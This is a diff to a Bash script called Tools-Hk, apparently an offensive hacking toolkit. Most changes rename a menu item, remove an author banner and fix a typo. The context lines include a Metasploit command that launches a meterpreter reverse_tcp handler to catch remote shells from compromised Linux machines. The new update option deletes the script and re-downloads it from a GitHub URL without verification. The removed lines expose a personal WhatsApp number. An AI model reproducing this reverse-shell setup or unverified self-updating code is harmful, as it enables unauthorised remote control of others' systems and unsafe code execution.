@@ -52,22 +52,6 @@ sleep 0.3
 echo -e $red
 #figlet -f smmono9 "Tools-Hk" 
 bash T
-sleep 0.3
-echo -e $white '#####################################'
-sleep 0.3
-echo -e $red '#                                   #'
-sleep 0.5
-echo -e $green '#    Name:- Tools-Hk V2.2.8         #'
-sleep 0.5
-echo -e $red '#    Author:- Mohammed Info         #'
-sleep 1.5
-echo -e $green '#    From:-   Yemen                 #'
-sleep 0.5
-echo -e $white '#    github:  profionaldhim         #'
-sleep 0.5
-echo -e $green '#    whatsapp :- +967733014747      #'
-sleep 0.5
-echo -e $white '#####################################'
 sleep 0.5
 echo -e $red
 echo -e $green"-------------------------------------------"
@@ -78,6 +62,8 @@ echo -e $yellow "By =====> $red HACKER / MOHAMMED Info <====="
 sleep 0
 echo ''
 }
+
+
 head () {
 echo -e $green
 #oilet -fecho -e $red
@@ -109,12 +95,9 @@ sleep 0
 echo -e $green   '{ -5- } ===> ' $white " Encrypt Your Tools"
 echo ""
 sleep 0
-echo -e $green   '{ -6- } ===> ' $red " About me"
+echo -e $green   '{ -6- } ===> ' $red " Update "
 echo ""
 sleep 0
-echo -e $green   '{ -7-} ===> ' $red " update"
-echo ""
-
 echo -e $green   "0- EXIT |-|"
 echo "" 
 echo "" 
@@ -1819,7 +1802,7 @@ echo ""
 toilet "START" | lolcat
 msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
 clear
-echo -e $green"Save Payload To" $HOME/$namp.elf
+echo -e $green"Save Payload To" $HOME/$name.elf
 else
 bash Tools-Hk.sh
 fi
@@ -4174,20 +4157,15 @@ clear
 bash Tools-Hk.sh
 fi
 fi
+
 if [ $name = 6 ]
 then
 clear
 head
-echo -e $red   "      About me"
+echo -e $red   "      Update Tools-Hk "
 echo ""
-echo -e $green "YOUTUBE: Mohammed Info "
-echo ""
-echo -e $green "FB: profionaldhim "
-echo ""
-echo -e $green "TWITTER: profionaldhim1 "
-echo ""
-echo -e $green "Whatsapp: 00967733014747"
-echo ""
+rm -rif Tools-Hk.sh
+hash -r && wget https://raw.githubusercontent.com/profionaldhim/Tools-Hk/master/Tools-Hk.sh
 echo -e $green "00- Back"
 echo ""
 read -p " insert : " about
